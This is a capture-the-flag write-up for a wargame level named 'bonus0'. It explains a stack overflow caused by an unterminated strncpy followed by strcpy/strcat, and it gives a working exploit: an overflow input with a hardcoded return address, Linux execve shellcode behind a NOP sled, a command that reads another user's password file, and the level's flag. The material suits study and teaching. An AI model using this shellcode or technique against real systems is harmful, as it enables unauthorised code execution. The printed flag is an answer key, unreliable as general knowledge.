# Bonus 0

**Vulnerability:** `strncpy` without NUL terminator + `strcpy`/`strcat` → stack overflow.

## Walkthrough

`p(dest, prompt)` reads up to 4096 bytes, strips the newline, then
`strncpy(dest, buf, 20)` — copying exactly 20 bytes and **leaving no NUL terminator**.

`pp()` calls `p()` twice into two adjacent 20-byte buffers `b1` and `b2`, then does
`strcpy(dest, b1)` followed by `strcat(dest, b2)`. Because `b1` isn't terminated, the
copy runs past it into `b2`, and the combined data overflows `dest` back in `main`,
which has only a 0x40-byte frame.

The return address overwrite was found at `0xbffffe46`. The shellcode is injected via
an environment variable fronted by a large NOP sled, and the return address points
into that sled.

## Exploit

```sh
python -c 'print "B"*4095+"\n"+"A"*9+"\x46\xfe\xff\xbf"+"B"*30' > /tmp/file
cat /tmp/file - | env -i payload=$(python -c 'print "\x90"*500+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') ./bonus0
# whoami -> bonus1
cat /home/user/bonus1/.pass
```

**Flag:** `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
